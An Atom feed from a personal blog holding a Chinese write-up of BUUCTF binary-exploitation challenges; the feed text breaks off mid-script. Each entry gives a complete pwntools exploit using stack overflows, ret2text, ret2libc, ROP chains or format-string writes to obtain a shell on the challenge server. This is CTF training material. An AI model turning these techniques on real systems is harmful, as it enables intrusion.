<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Clovershrub</title>
  
  
  <link href="https://clovershrub.github.io/atom.xml" rel="self"/>
  
  <link href="https://clovershrub.github.io/"/>
  <updated>2023-09-19T01:35:03.496Z</updated>
  <id>https://clovershrub.github.io/</id>
  
  <author>
    <name>Clovershrub</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUCTF二进制漏洞</title>
    <link href="https://clovershrub.github.io/2023/08/06/BUUCTF%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/"/>
    <id>https://clovershrub.github.io/2023/08/06/BUUCTF%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-05T16:00:00.000Z</published>
    <updated>2023-09-19T01:35:03.496Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF二进制漏洞第一页部分题目"><a href="#BUUCTF二进制漏洞第一页部分题目" class="headerlink" title="BUUCTF二进制漏洞第一页部分题目"></a>BUUCTF二进制漏洞第一页部分题目</h1><p>64位前几个参数：rdi, rsi, rdx, rcx, r8, r9</p><h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>连上之后直接cat flag即可。</p><h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>简单的ret2text。<br>gets()存在栈溢出，可以找到fun()函数执行system(“&#x2F;bin&#x2F;sh”).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25327</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xf</span> + <span class="number">8</span>) + p64(<span class="number">0x401186</span>+<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里的+1据百度是为了配合更新之后的buu环境。在本地不+1也是可以打通的。</p><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>简单的ret2text。<br>这道题它虽然打印了危险函数的地址，但是并没有开启PIE。所以照常写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26638</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(<span class="number">0x40060d</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>简单的ret2text。<br>有NX没PIE，虽然限制了输入的长度，但是程序会将输入里的I都替换成you，有栈溢出的可能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26895</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> + <span class="string">b&#x27;I&#x27;</span> * <span class="number">21</span> + p32(<span class="number">0x8048F0D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p>简单的ret2text。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25991</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">8</span>) + p64(<span class="number">0x400596</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p>简单的格式化字符串漏洞。<br>有canary有NX，栈溢出困难，考虑格式化字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26997</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露栈空间</span></span><br><span class="line"><span class="comment"># payload = b&#x27;AAAA&#x27; + b&#x27;%p&#x27; * 15</span></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%12$nxxx&#x27;</span> + p32(<span class="number">0x0804C044</span>)<span class="comment"># &#x27;xxx&#x27;用于填充位数，使得p32()的内容是第12个参数</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;your name:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;your passwd:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露内容</span></span><br><span class="line"><span class="comment"># AAAA 0xffb511e8 0x63 (nil) 0xffb5120e 0x3 0xc2 0xf7df791b 0xffb5120e 0xffb5130c 0x41414141</span></span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p>好尼玛难的ret2libc，也许是因为第一次做吧<br>64位程序调用函数时的第一个参数由rdi传递。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">attachment = ELF(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27271</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = attachment.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = attachment.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">encrypt = attachment.symbols[<span class="string">&#x27;encrypt&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露puts()的got表地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x58</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据泄露内容，计算libc基址和system()、&quot;/bin/sh&quot;的地址</span></span><br><span class="line">puts_addr = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#攻击</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x58</span> + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这道题如果按照ctf-wiki上的泄露__libc_start_main的got表地址是打不通的。。。</p><h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>栈溢出，保护开得很全</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29515</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./ciscn_2019_n_8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x11\x00\x00\x00&#x27;</span> * <span class="number">14</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>简单的ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28441</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x0804A024</span></span><br><span class="line">system_plt = <span class="number">0x08048320</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_plt) + <span class="string">b&#x27;dead&#x27;</span> + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><p>简单的ret2text。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29381</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./bjdctf_2020_babystack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4006E6</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;[+]Please input the length of your name:&#x27;</span>, <span class="string">b&#x27;99&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span> + <span class="number">8</span>) + p64(backdoor)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span> , payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>奇怪的ret2text。<br>不过这题很神奇，据百度，需要给它一个正常退出程序的地址，不然程序会崩。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28077</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x080489A0</span></span><br><span class="line">exit = <span class="number">0x0804E6A0</span> <span class="comment"># 就是它，这个不能动</span></span><br><span class="line">a1 = <span class="number">0x308CD64F</span></span><br><span class="line">a2 = <span class="number">0x195719D1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x38</span>) + p32(backdoor) + p32(exit) + p32(a1) + p32(a2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>更复杂的ret2libc。<br>先用’\x00’绕过strlen()函数，再将buf[7]设为’\xff’便于溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28640</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = attachment.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = attachment.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = <span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">8</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xe7</span> + <span class="number">4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Correct\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">8</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xe7</span> + <span class="number">4</span>) + p32(system_addr) + <span class="string">b&#x27;dead&#x27;</span> + p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Correct\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这道题的libc要用它给的，用LibcSearcher搜出来的打不通。。。</p><h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><p>简单的ewr2libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25104</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x0000000000600A90</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004006b3</span></span><br><span class="line">system_plt = <span class="number">0x00000000004004c0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">128</span> + <span class="number">8</span>) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><p>简单的ret2libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27443</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x0000000000601048</span></span><br><span class="line">system_plt = <span class="number">0x0000000000400490</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400683</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat home/babyrop/flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>（我们要强烈谴责这种藏flag的行为）</p><h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>与ciscn_2019_c_1完全一样。</p><h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>ret2shellcode总是报错，所以用ret2libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26133</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400713</span></span><br><span class="line">puts_plt = attachment.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = attachment.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x400636</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;tell me your name&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What do you want to say to me?&#x27;</span>, payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;tell me your name&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What do you want to say to me?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>稍难的ret2text。<br>get_secret()函数中只有写flag的步骤，没有输出的步骤。需要调用一下printf()函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28017</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_secret = <span class="number">0x080489A0</span></span><br><span class="line">main = <span class="number">0x080489E0</span></span><br><span class="line">printf = <span class="number">0x0804F0A0</span></span><br><span class="line">flag = <span class="number">0x080ECA2D</span></span><br><span class="line">exit = <span class="number">0x0804E660</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2d</span> + p32(get_secret) + p32(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2d</span> + p32(printf) + p32(exit) + p32(flag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><p>连上就行。</p><h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>strcpy()函数没检查终止，可以溢出。<br>ret2text。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 